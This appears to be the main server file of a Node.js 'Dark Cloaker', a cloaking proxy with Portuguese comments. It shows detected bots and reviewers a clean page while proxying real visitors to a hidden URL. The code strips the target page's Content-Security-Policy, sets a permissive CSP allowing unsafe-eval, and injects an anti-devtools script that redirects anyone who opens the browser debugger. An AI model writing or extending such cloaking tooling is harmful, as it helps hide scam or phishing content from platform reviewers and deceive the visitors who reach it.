require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const helmet = require("helmet");
const { createProxyMiddleware } = require("http-proxy-middleware");
const { isBot } = require("./utils/botDetection");
const { mutateHTMLSafe } = require("./utils/mutator");
const Domain = require("./models/Domain");
const axios = require("axios");

const app = express();

// Segurança
app.use(cors());
app.use(helmet());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Rotas da API
const authRoutes = require("./routes/auth.routes");
const domainRoutes = require("./routes/domain.routes");
app.use("/api/auth", authRoutes);
app.use("/api/domain", domainRoutes);

// Conexão MongoDB
(async () => {
  try {
    await mongoose.connect(process.env.MONGO_URI);
    console.log("🔥 MongoDB conectado");
  } catch (err) {
    console.error("❌ Erro MongoDB:", err.message);
    process.exit(1);
  }
})();

// Middleware universal (cloaking + proxy)
app.use(async (req, res, next) => {
  try {
    const host = req.hostname;
    const ua = req.headers["user-agent"] || "";
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
    const urlPath = req.originalUrl;

    const domain = await Domain.findOne({ officialUrl: `https://${host}` });
    if (!domain) return res.redirect("https://google.com");

    const isBotVisit = isBot(ua, ip);
    const targetUrl = isBotVisit ? domain.baseUrl : domain.realUrl;
    const fullUrl = `${targetUrl}${urlPath}`;

    // 🔁 Proxy de assets (css, js, fontes, imagens, etc)
    const isAsset = /\.(js|css|png|jpe?g|gif|svg|woff2?|ttf|eot|ico|json|txt|webp|mp4|map)(\?.*)?$/.test(urlPath);
    if (isAsset) {
      return createProxyMiddleware({
        target: targetUrl,
        changeOrigin: true,
        selfHandleResponse: false,
        headers: {
          "User-Agent": ua,
          "X-Forwarded-For": ip,
          Referer: req.get("referer") || '',
        }
      })(req, res);
    }

    // 🔁 Proxy do HTML principal (com mutação e proteção)
    const headers = {
      "User-Agent": ua,
      "X-Forwarded-For": ip,
      Referer: req.get("referer") || '',
    };

    const response = await axios.get(fullUrl, { headers });
    let html = response.data;

    // Proteção anti-devtools e clonagem
     const antiDebug = `
      <script>
        function devtoolsDetector(){
          const s = performance.now(); debugger; const e = performance.now();
          if(e-s>100){ window.location.href='${domain.fallbackUrl}'; }
        }
    
      </script>
    `;

    html = mutateHTMLSafe(html);
    html = html.replace(/(src|href)=["']\.\/(.*?)["']/g, `$1="${targetUrl}/$2"`);
    html = html.replace(/(src|href)=["']\/(.*?)["']/g, `$1="${targetUrl}/$2"`);
    html = html.replace(/<meta[^>]+http-equiv=["']Content-Security-Policy["'][^>]*>/gi, "");

    html = html.replace("</body>", `${antiDebug}</body>`);

    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Content-Security-Policy", "default-src * data: blob: 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline' 'unsafe-eval'; style-src * 'unsafe-inline'; img-src * data: blob:; font-src * data:");
    
    return res.send(html);

  } catch (err) {
    console.error("❌ Erro proxy blindado:", err.message);
    return res.redirect("https://google.com");
  }
});

// Start
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
  console.log(`☠️ Dark Cloaker rodando blindado na porta ${PORT}`);
});
